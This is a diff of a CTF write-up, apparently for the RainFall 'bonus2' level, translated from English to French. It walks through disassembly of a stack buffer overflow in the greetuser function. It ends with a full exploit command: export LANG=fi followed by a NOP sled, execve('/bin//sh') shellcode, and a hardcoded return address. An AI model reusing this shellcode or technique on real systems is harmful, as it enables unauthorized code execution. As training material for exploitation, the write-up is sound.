@@ -1,6 +1,6 @@
-# Bonus 2
+# 12 - Stack buffer overflow 3
 
-- We login as user bonus2:
+- On se connecte en tant que bonus2:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
@@ -148,7 +148,7 @@ Dump of assembler code for function greetuser:
 End of assembler dump.
 ```
 
-- Let's highlight the most important parts of the program:
+- Voyons les parties les plus importantes du programme:
 ```
    0x0804855c <+51>:    mov    0xc(%ebp),%eax
    0x0804855f <+54>:    add    $0x4,%eax
@@ -159,7 +159,7 @@ End of assembler dump.
    0x08048574 <+75>:    mov    %eax,(%esp)
    0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
 ```
->Copy 0x28 bytes from the first parameter passed to the program into `0x50(%esp)`.
+>Copie 0x28 octets du premier paramètre passé au programme en `0x50(%esp)`.
 
 ```
    0x0804857c <+83>:    mov    0xc(%ebp),%eax
@@ -172,7 +172,7 @@ End of assembler dump.
    0x08048597 <+110>:   mov    %eax,(%esp)
    0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
 ```
->Copy 0x20 bytes from the second parameter provided to the program after the first buffer.
+>Copie 0x20 octets du deuxième paramètre passé au programme en `0x50(%esp) + 0x28`.
 
 ```
    0x0804859f <+118>:   movl   $0x8048738,(%esp)
@@ -183,7 +183,7 @@ End of assembler dump.
 ```
 >`0x8048738: "LANG"`
 
->If the "LANG" environment variable does not exist, jump to `<main+239>` (just before the call to the `<greetuser>` function).
+>Si la variable d'environnement "LANG" n'existe pas, saute en `<main+239>`.
 
 ```
    0x080485bc <+147>:   movl   $0x2,0x8(%esp)
@@ -213,7 +213,7 @@ End of assembler dump.
 
 >`0x8049988 <language>: 0x00000000`
 
->If the first two characters of the return from `<getenv@plt>` are "fi" / "nl", set the variable `<language>` to 1 / 2, then jump to `<main+239>`.
+> Si les deux premiers caractères de la valeur retournée par `<getenv@plt>` sont "fi" / "nl", met la variable `<language>` à 1 / 2, puis saute en `<main+239>`.
 
 ```
    0x08048618 <+239>:   mov    %esp,%edx
@@ -226,9 +226,10 @@ End of assembler dump.
    0x0804862b <+258>:   call   0x8048484 <greetuser>
 
 ```
->Copy 0x13 times 4 bytes from the buffer containing our parameters to the beginning of the stack, then call the `<greetuser>` function.
+> Copie 0x13 fois 4 octets du buffer contenant nos paramètres au début de la pile, puis appelle la fonction `<greetuser>`.
 
-- So, the `<main>` function takes two arguments that it copies onto the stack. Then it attempts to set the `<language>` variable before preparing the stack for the `<greetuser>` function call. Let's now take a closer look at the `<greetuser>` function.
+- Donc la fonction `<main>` prend deux arguments qu'elle copie sur la pile. Ensuite elle tente de définir la variable `<language>` avant de préparer la pile pour l'appel de la fonction `<greetuser>`. Regardons maintenant de plus près la fonction `<greetuser>`.
+
 ```
    0x0804848a <+6>:     mov    0x8049988,%eax
    0x0804848f <+11>:    cmp    $0x1,%eax
@@ -238,7 +239,7 @@ End of assembler dump.
    0x08048499 <+21>:    test   %eax,%eax
    0x0804849b <+23>:    jne    0x804850a <greetuser+134>
 ```
->Redirect the program's execution flow based on the value of the `<language>` variable.
+> Redirige l'execution du programme en fonction de la valeur de la variable `<language>`.
 
 ```
    0x0804849d <+25>:    mov    $0x8048710,%edx
@@ -297,11 +298,11 @@ End of assembler dump.
    0x08048522 <+158>:   call   0x8048390 <puts@plt>
 ```
 
-- The `<greetuser>` function will simply concatenate a greeting message with our parameters and then will display it. The greeting message depends on the "LANG" environment variable. The problem is that it concatenates a buffer that can contain up to 0x48 characters after a string, in an area located just 0x48 bytes above ebp. So if the buffer actually contains 0x48 characters, this will modify the return address of the `<greetuser>` function.
+- La fonction `<greetuser>` va simplement concaténer un message de salutation avec nos paramètres puis l'affichera. Le message de salutation dépend de la variable d'environnement "LANG".
 
-- However, when the chosen language is neither "fi" nor "nl", english is chosen by default. The English greeting message is not long enough to allow our buffer to completely modify the return address of `<greetuser>`. To fully exploit this vulnerability, we will first need to change the "LANG" environment variable.
+- Avec un payload assez long, on peut modifier l'adresse de retour de la fonction `<greetuser>`.
 
-- So:
+- Cependant, lorsque la langue choisie n'est ni "fi" ni "nl", l'anglais est choisi par défaut. Le message de salutation en anglais n'est pas assez long pour permettre à notre payload de modifier complètement l'adresse de retour de `<greetuser>`. Pour exploiter cette overflow, nous devrons d'abord changer la variable d'environnement "LANG":
 ```
 bonus2@RainFall:~$ export LANG=fi
 bonus2@RainFall:~$ ./bonus2 $(python -c "print('\x90'*26 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68')") $(python -c "print('\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*10 + '\x2e\xf6\xff\xbf')")
